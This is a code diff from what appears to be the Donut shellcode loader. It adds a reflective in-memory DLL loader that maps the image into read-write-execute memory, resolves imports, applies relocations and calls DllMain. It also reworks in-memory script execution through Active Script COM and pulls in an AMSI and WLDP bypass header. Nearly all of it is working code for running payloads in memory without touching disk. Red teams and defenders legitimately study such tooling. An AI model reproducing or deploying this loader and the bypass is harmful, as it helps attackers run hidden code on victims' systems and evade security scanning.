@@ -649,31 +649,35 @@ BOOL DownloadModule(PDONUT_INSTANCE inst) {
     return bResult;
 }
 
+#ifdef _WIN64
+#define IMAGE_REL_TYPE IMAGE_REL_BASED_DIR64
+#else
+#define IMAGE_REL_TYPE IMAGE_REL_BASED_HIGHLOW
+#endif
+
 typedef struct _IMAGE_RELOC {
     WORD offset :12;
     WORD type   :4;
 } IMAGE_RELOC, *PIMAGE_RELOC;
 
-typedef int (*start_t)(void);
+typedef BOOL (WINAPI *DllMain_t)(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved);
 
-// In-memory execution of a PE or DLL file.
-// Not implemented just yet.
-VOID LoadPE(PDONUT_INSTANCE inst) {
+// In-Memory execution of unmanaged DLL file.
+VOID LoadDLL(PDONUT_INSTANCE inst) {
     PIMAGE_DOS_HEADER        dos;
     PIMAGE_NT_HEADERS        nt;
-    PIMAGE_OPTIONAL_HEADER   opt;
-    PIMAGE_DATA_DIRECTORY    dir;
     PIMAGE_SECTION_HEADER    sh;
     PIMAGE_THUNK_DATA        oft, ft;
     PIMAGE_IMPORT_BY_NAME    ibn;
     PIMAGE_IMPORT_DESCRIPTOR imp;
+    PIMAGE_RELOC             list;
     PIMAGE_BASE_RELOCATION   ibr;
     DWORD                    rva;
-    ULONGLONG                ofs;
+    PBYTE                    ofs;
     PCHAR                    name;
     HMODULE                  dll;
     ULONG_PTR                ptr;
-    start_t                  start;
+    DllMain_t                DllMain;
     LPVOID                   cs, base;
     DWORD                    i, cnt;
     PDONUT_MODULE            mod;
@@ -686,119 +690,80 @@ VOID LoadPE(PDONUT_INSTANCE inst) {
       mod = inst->module.p;
     }
     
-    base = (PBYTE)mod->data;
+    base = mod->data;
+    dos  = (PIMAGE_DOS_HEADER)base;
+    nt   = RVA2VA(PIMAGE_NT_HEADERS, base, dos->e_lfanew);
     
-    dos = (PIMAGE_DOS_HEADER)base;
-    nt  = RVA2VA(PIMAGE_NT_HEADERS, base, dos->e_lfanew);
-    opt = (PIMAGE_OPTIONAL_HEADER)&nt->OptionalHeader;
-    dir = (PIMAGE_DATA_DIRECTORY)opt->DataDirectory;
-    
-    DPRINT("Allocating memory for module");
-    cs = inst->api.VirtualAlloc(
-      NULL, opt->SizeOfImage, 
+    DPRINT("Allocate RWX memory for file");
+    cs  = inst->api.VirtualAlloc(
+      NULL, nt->OptionalHeader.SizeOfImage, 
       MEM_COMMIT | MEM_RESERVE, 
-      PAGE_READWRITE);
+      PAGE_EXECUTE_READWRITE);
       
-    if(cs != NULL) {
-      DPRINT("Mapping sections");
-      sh  = IMAGE_FIRST_SECTION(nt);
+    DPRINT("Copying each section to RWX memory");
+    sh = IMAGE_FIRST_SECTION(nt);
       
-      for(i=0; i<nt->FileHeader.NumberOfSections; i++) {
-        DPRINT("Copying section %s to memory", sh[i].Name);
-        Memcpy(
-         (PBYTE)cs + sh[i].VirtualAddress,
+    for(i=0; i<nt->FileHeader.NumberOfSections; i++) {
+      Memcpy((PBYTE)cs + sh[i].VirtualAddress,
           (PBYTE)base + sh[i].PointerToRawData,
           sh[i].SizeOfRawData);
-      }
-        
-      DPRINT("Processing Import Table");
-      rva  = dir[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
-      imp = RVA2VA(PIMAGE_IMPORT_DESCRIPTOR, cs, rva);
-    
-      // for each DLL
-      for (;imp->Name!=0; imp++) {
-        name = RVA2VA(PCHAR, cs, imp->Name);
-        
-        // load DLL
-        DPRINT("Loading %s", name);
-        dll  = inst->api.LoadLibrary(name);
-        
-        // resolve the imports for this library
-        oft  = RVA2VA(PIMAGE_THUNK_DATA, cs, imp->OriginalFirstThunk);
-        ft   = RVA2VA(PIMAGE_THUNK_DATA, cs, imp->FirstThunk);
-          
-        // for each API
-        for (;; oft++, ft++) {
-          // no API left?
-          if (oft->u1.AddressOfData == 0) break;
-          
-          PULONG_PTR func = (PULONG_PTR)&ft->u1.Function;
-          
-          // resolve by ordinal?
-          if (IMAGE_SNAP_BY_ORDINAL(oft->u1.Ordinal)) {
-            *func = (ULONG_PTR)inst->api.GetProcAddress(dll, (LPCSTR)IMAGE_ORDINAL(oft->u1.Ordinal));
-          } else {
-            // resolve by name
-            ibn   = RVA2VA(PIMAGE_IMPORT_BY_NAME, cs, oft->u1.AddressOfData);
-            *func = (ULONG_PTR)inst->api.GetProcAddress(dll, ibn->Name);
-          }
-        }
-      }
-        
-      DPRINT("Fixing up relocations");
-      ibr  = RVA2VA(PIMAGE_BASE_RELOCATION, cs, dir[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
-      ofs  = (ULONGLONG)((ULONGLONG)cs - opt->ImageBase);
-      
-      for(;ibr->VirtualAddress != 0;) {
-        if(ibr->SizeOfBlock >= sizeof(IMAGE_BASE_RELOCATION)) {
-          // number of relocation descriptors
-          cnt = (ibr->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(IMAGE_RELOC);
-          ptr = RVA2VA(ULONG_PTR, cs, ibr->VirtualAddress);
-          
-          PIMAGE_RELOC list = (PIMAGE_RELOC)(ibr + 1);
-
-          // for each descriptor
-          for(i=0; i<cnt; i++) {
-            if(list[i].type == IMAGE_REL_BASED_DIR64) {
-              *(ULONG_PTR*)((PBYTE)cs + ibr->VirtualAddress + list[i].offset) += ofs;
-            } else
-            if(list[i].type == IMAGE_REL_BASED_HIGHLOW) {
-              *(DWORD*)((PBYTE)cs + ibr->VirtualAddress + list[i].offset) += (DWORD)ofs;
-            } else
-            if(list[i].type == IMAGE_REL_BASED_HIGH) {
-              *(WORD*)((PBYTE)cs + ibr->VirtualAddress + list[i].offset) += HIWORD(ofs);
-            } else
-            if(list[i].type == IMAGE_REL_BASED_LOW) {
-              *(WORD*)((PBYTE)cs + ibr->VirtualAddress + list[i].offset) += LOWORD(ofs);
-            } else 
-            if(list[i].type == IMAGE_REL_BASED_ABSOLUTE) {
-              // 
-            }
-          }
-        }
-        ibr = (PIMAGE_BASE_RELOCATION)((PBYTE)ibr + ibr->SizeOfBlock);
-      }
-        
-      DWORD old;
-      
-      for(i=0; i<nt->FileHeader.NumberOfSections; i++) {
-        if(sh[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) {
-          DPRINT("Setting %s to executable", sh[i].Name);
-          inst->api.VirtualProtect(
-            (PBYTE)cs + sh[i].VirtualAddress, 
-            (SIZE_T)sh[i].SizeOfRawData, 
-            PAGE_EXECUTE_READ, &old);
-        }
-      }
-
-      // execute entrypoint
-      DPRINT("Executing entrypoint");
-      start = RVA2VA(start_t, cs, opt->AddressOfEntryPoint);
-      start();
-      
-      // free memory
-      inst->api.VirtualFree(cs, 0, MEM_DECOMMIT | MEM_RELEASE);
     }
+    
+    DPRINT("Processing the Import Table");
+    rva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
+    imp = RVA2VA(PIMAGE_IMPORT_DESCRIPTOR, cs, rva);
+      
+    // For each DLL
+    for (;imp->Name!=0; imp++) {
+      name = RVA2VA(PCHAR, cs, imp->Name);
+      
+      DPRINT("Loading %s", name);
+      dll = inst->api.LoadLibrary(name);
+      
+      // Resolve the API for this library
+      oft = RVA2VA(PIMAGE_THUNK_DATA, cs, imp->OriginalFirstThunk);
+      ft  = RVA2VA(PIMAGE_THUNK_DATA, cs, imp->FirstThunk);
+        
+      // For each API
+      for (;; oft++, ft++) {
+        // No API left?
+        if (oft->u1.AddressOfData == 0) break;
+        
+        PULONG_PTR func = (PULONG_PTR)&ft->u1.Function;
+        
+        // Resolve by ordinal?
+        if (IMAGE_SNAP_BY_ORDINAL(oft->u1.Ordinal)) {
+          *func = (ULONG_PTR)inst->api.GetProcAddress(dll, (LPCSTR)IMAGE_ORDINAL(oft->u1.Ordinal));
+        } else {
+          // Resolve by name
+          ibn   = RVA2VA(PIMAGE_IMPORT_BY_NAME, cs, oft->u1.AddressOfData);
+          *func = (ULONG_PTR)inst->api.GetProcAddress(dll, ibn->Name);
+        }
+      }
+    }
+    
+    DPRINT("Applying Relocations");
+    rva  = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
+    ibr  = RVA2VA(PIMAGE_BASE_RELOCATION, cs, rva);
+    ofs  = (PBYTE)cs - nt->OptionalHeader.ImageBase;
+    
+    while(ibr->VirtualAddress != 0) {
+      list = (PIMAGE_RELOC)(ibr + 1);
+
+      while ((PBYTE)list != (PBYTE)ibr + ibr->SizeOfBlock) {
+        if(list->type == IMAGE_REL_TYPE) {
+          *(ULONG_PTR*)((PBYTE)cs + ibr->VirtualAddress + list->offset) += (ULONG_PTR)ofs;
+        } else if(list->type != IMAGE_REL_BASED_ABSOLUTE) {
+          DPRINT("ERROR: Unrecognized Relocation type.");
+        }
+        list++;
+      }
+      ibr = (PIMAGE_BASE_RELOCATION)list;
+    }
+
+    DPRINT("Executing DllMain");
+    DllMain = RVA2VA(DllMain_t, cs, nt->OptionalHeader.AddressOfEntryPoint);
+    DllMain(cs, DLL_PROCESS_ATTACH, NULL);
 }
     
 VOID RunXML(PDONUT_INSTANCE inst) {
@@ -881,25 +846,12 @@ VOID RunXML(PDONUT_INSTANCE inst) {
     }
 }
 
-// forward reference to methods
-static STDMETHODIMP QueryInterface(IActiveScriptSite *this, REFIID riid, void **ppv);
-static STDMETHODIMP_(ULONG) AddRef(IActiveScriptSite *this);
-static STDMETHODIMP_(ULONG) Release(IActiveScriptSite *this);
-static STDMETHODIMP GetItemInfo(IActiveScriptSite *this, LPCOLESTR objectName, DWORD dwReturnMask, IUnknown **objPtr, ITypeInfo **typeInfo);
-static STDMETHODIMP OnScriptError(IActiveScriptSite *this, IActiveScriptError *scriptError);
-static STDMETHODIMP GetLCID(IActiveScriptSite *this, LCID *lcid);
-static STDMETHODIMP GetDocVersionString(IActiveScriptSite *this, BSTR *version);
-static STDMETHODIMP OnScriptTerminate(IActiveScriptSite *this, const VARIANT *pvr, const EXCEPINFO *pei);
-static STDMETHODIMP OnStateChange(IActiveScriptSite *this, SCRIPTSTATE state);
-static STDMETHODIMP OnEnterScript(IActiveScriptSite *this);
-static STDMETHODIMP OnLeaveScript(IActiveScriptSite *this);
-
 VOID RunScript(PDONUT_INSTANCE inst) {
     HRESULT                hr;
     IActiveScriptParse     *parser;
     IActiveScript          *engine;
     MyIActiveScriptSite    mas;
-    IActiveScriptSiteVtbl2 vf_tbl;
+    IActiveScriptSiteVtbl  vf_tbl;
     PDONUT_MODULE          mod;
     PWCHAR                 script;
     ULONG64                len;
@@ -928,34 +880,22 @@ VOID RunScript(PDONUT_INSTANCE inst) {
         script[len] = c;
       }
       
-      // 3. Initialize IActiveScriptSiteVtbl2 and assign to lpVtbl pointer
-      //    Create event for when script ends
-      vf_tbl.QueryInterface      = ADR(ULONG_PTR, QueryInterface);
-      vf_tbl.AddRef              = ADR(ULONG_PTR, AddRef);
-      vf_tbl.Release             = ADR(ULONG_PTR, Release);
-      vf_tbl.GetLCID             = ADR(ULONG_PTR, GetLCID);
-      vf_tbl.GetItemInfo         = ADR(ULONG_PTR, GetItemInfo);
-      vf_tbl.GetDocVersionString = ADR(ULONG_PTR, GetDocVersionString);
-      vf_tbl.OnScriptTerminate   = ADR(ULONG_PTR, OnScriptTerminate);
-      vf_tbl.OnStateChange       = ADR(ULONG_PTR, OnStateChange);
-      vf_tbl.OnScriptError       = ADR(ULONG_PTR, OnScriptError);
-      vf_tbl.OnEnterScript       = ADR(ULONG_PTR, OnEnterScript);
-      vf_tbl.OnLeaveScript       = ADR(ULONG_PTR, OnLeaveScript);
+      mas.site.lpVtbl = (IActiveScriptSiteVtbl*)&vf_tbl;
+      ActiveScript_New(&mas.site);
       
       // 4. Initialize COM, MyIActiveScriptSite and event for OnLeaveScript method
       DPRINT("CoInitializeEx");
       hr = inst->api.CoInitializeEx(NULL, COINIT_MULTITHREADED);
       
       if(hr == S_OK) {
-        mas.site.lpVtbl    = (IActiveScriptSiteVtbl*)&vf_tbl;
         mas.siteWnd.lpVtbl = NULL;
         mas.hEvent         = inst->api.CreateEvent(NULL, FALSE, FALSE, NULL);
-        mas._SetEvent      = (SetEvent_t)inst->api.SetEvent;
         
         // 5. Instantiate the active script engine
         DPRINT("CoCreateInstance");
         hr = inst->api.CoCreateInstance(
-          &inst->xCLSID_ScriptLanguage, 0, CLSCTX_ALL, 
+          &inst->xCLSID_ScriptLanguage, 0, 
+          CLSCTX_INPROC_SERVER | CLSCTX_INPROC_HANDLER, 
           &inst->xIID_IActiveScript, (void **)&engine);
       
         if(hr == S_OK) {
@@ -980,10 +920,17 @@ VOID RunScript(PDONUT_INSTANCE inst) {
               hr = engine->lpVtbl->SetScriptSite(
                 engine, (IActiveScriptSite *)&mas);
               if(hr == S_OK) {
+                BSTR obj = inst->api.SysAllocString(L"WScript");
+              hr = engine->lpVtbl->AddNamedItem(engine, (LPCOLESTR)obj, SCRIPTITEM_ISVISIBLE); 
+              DPRINT("HRESULT: %08lx", hr);
+              
+              engine->lpVtbl->AddNamedItem(engine, OLESTR("WSH"), SCRIPTITEM_ISVISIBLE); 
+              engine->lpVtbl->SetScriptState(engine, SCRIPTSTATE_INITIALIZED);
                 // 9. Load script
                 DPRINT("IActiveScriptParse::ParseScriptText");
                 hr = parser->lpVtbl->ParseScriptText(
-                  parser, (LPCOLESTR)script, 0, 0, 0, 0, 0, 0, 0, 0);
+                  parser, (LPCOLESTR)script, NULL, NULL, NULL, 1, 1, 
+                  SCRIPTTEXT_HOSTMANAGESSOURCE|SCRIPTITEM_ISVISIBLE, NULL, NULL);
                 if(hr == S_OK) {
                   // 10. Run script
                   DPRINT("IActiveScript::SetScriptState");
@@ -1005,70 +952,6 @@ VOID RunScript(PDONUT_INSTANCE inst) {
       }
       inst->api.VirtualFree(script, 0, MEM_RELEASE | MEM_DECOMMIT);
     }
-}
-
-static STDMETHODIMP QueryInterface(IActiveScriptSite *this, REFIID riid, void **ppv) {
-    DPRINT("QueryInterface");
-    return E_NOTIMPL;
-}
-
-static STDMETHODIMP_(ULONG) AddRef(IActiveScriptSite *this) {
-    DPRINT("AddRef");
-    return 1;
-}
-
-static STDMETHODIMP_(ULONG) Release(IActiveScriptSite *this) {
-    DPRINT("Release");
-    return 0;
-}
-
-static STDMETHODIMP GetItemInfo(IActiveScriptSite *this, 
-  LPCOLESTR objectName, DWORD dwReturnMask, 
-  IUnknown **objPtr, ITypeInfo **typeInfo) {
-    DPRINT("GetItemInfo");
-    return TYPE_E_ELEMENTNOTFOUND;
-}
-
-static STDMETHODIMP OnScriptError(IActiveScriptSite *this, 
-  IActiveScriptError *scriptError) {
-    DPRINT("OnScriptError");
-    return S_OK;
-}
-
-static STDMETHODIMP GetLCID(IActiveScriptSite *this, LCID *lcid) {
-    DPRINT("GetLCID");
-    return S_OK;
-}
-
-static STDMETHODIMP GetDocVersionString(IActiveScriptSite *this, BSTR *version) {
-    DPRINT("GetDocVersionString\n");
-    return S_OK;
-}
-
-static STDMETHODIMP OnScriptTerminate(IActiveScriptSite *this, 
-  const VARIANT *pvr, const EXCEPINFO *pei) {
-    DPRINT("OnScriptTerminate");
-    return S_OK;
-}
-
-static STDMETHODIMP OnStateChange(IActiveScriptSite *this, SCRIPTSTATE state) {
-    DPRINT("OnStateChange");
-    return S_OK;
-}
-
-static STDMETHODIMP OnEnterScript(IActiveScriptSite *this) {
-    DPRINT("OnEnterScript");
-    return S_OK;
-}
-
-static STDMETHODIMP OnLeaveScript(IActiveScriptSite *this) {
-    MyIActiveScriptSite *mas = (MyIActiveScriptSite*)this;
-    
-    DPRINT("OnScriptLeave");
-    
-    mas->_SetEvent(mas->hEvent);
-    
-    return S_OK;
 }
 
 // locate address of API in export table
@@ -1190,57 +1073,10 @@ LPVOID xGetProcAddress(PDONUT_INSTANCE inst, ULONG64 ulHash, ULONG64 ulIV) {
     return addr;
 }
 
-// functions to bypass AMSI and WLDP code integrity
+// functions to bypass AMSI and WLDP
 #include "bypass.h"
-
-// Function to return the program counter.
-// Always placed at the end of payload.
-// Tested with x86 and x64 builds of MSVC 2017 and MinGW. YMMV.
-#if defined(_MSC_VER) 
-  #if defined(_M_X64)
-
-    #define PC_CODE_SIZE 9 // sub rsp, 40 / call get_pc
-
-    static char *get_pc_stub(void) {
-      return (char*)_ReturnAddress() - PC_CODE_SIZE;
-    }
-    
-    static char *get_pc(void) {
-      return get_pc_stub();
-    }
-
-  #elif defined(_M_IX86)
-    __declspec(naked) static char *get_pc(void) {
-      __asm {
-          call   pc_addr
-        pc_addr:
-          pop    eax
-          sub    eax, 5
-          ret
-      }
-    }
-  #endif  
-#elif defined(__GNUC__) 
-  #if defined(__x86_64__)
-    __attribute__((naked)) static char *get_pc(void) {
-        __asm__ (
-        "call   pc_addr\n"
-      "pc_addr:\n"
-        "pop    %rax\n"
-        "sub    $5, %rax\n"
-        "ret");
-    }
-  #elif defined(__i386__)
-    __attribute__((naked)) static char *get_pc(void) {
-        __asm__ (
-        "call   pc_addr\n"
-      "pc_addr:\n"
-        "popl   %eax\n"
-        "subl   $5, %eax\n"
-        "ret");
-    }
-  #endif
-#endif
+// code stubs to return program counter
+#include "getpc.h"
 
 // the following code is *only* for development purposes
 // given an instance file, it will run as if running on a target system
